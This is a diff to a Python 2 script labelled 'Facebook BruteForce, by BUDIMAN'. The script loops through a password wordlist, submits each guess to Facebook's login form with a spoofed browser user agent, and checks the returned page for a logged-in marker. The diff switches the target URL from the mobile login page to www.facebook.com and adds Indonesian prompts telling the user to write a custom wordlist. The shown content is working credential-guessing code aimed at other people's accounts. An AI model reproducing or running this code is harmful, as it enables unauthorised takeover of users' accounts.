@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-        #############################################
+        #___________________________________________#
         #                                           #
         #       Facebook BruteForce, by BUDIMAN     #
         #       Contact: ariftau285@gmail.com       #
@@ -53,14 +53,14 @@ for password in wordlist:
             browser = mechanize.Browser()
             browser.set_handle_robots(False)
             browser.addheaders = [('User-agent', "Mozilla/62.0 (Windows NT 6.1)  Chrome/69.0.3497.100 Safari/537.36")]
-            fb = browser.open('https://mbasic.facebook.com')
+            fb = browser.open('https://www.facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
             browser.form['email'] = user
             browser.form['pass'] = password
             browser.method = 'POST'
             browser.submit()
-            dos.write(browser.open('https://mbasic.facebook.com').read())
+            dos.write(browser.open('https://www.facebook.com').read())
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
@@ -77,7 +77,9 @@ for password in wordlist:
             exit()
 
 time.sleep(1)
-print 'tak ada satupun SANDI yang bener coba pake racikan sendiri.'
+print 'tak ada satupun SANDI yang bener coba pake racikan sendiri.ketik seperti di bawah ini untuk meracik'
+time.sleep(0.9)
+print '\nnano wordlist.txt'
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
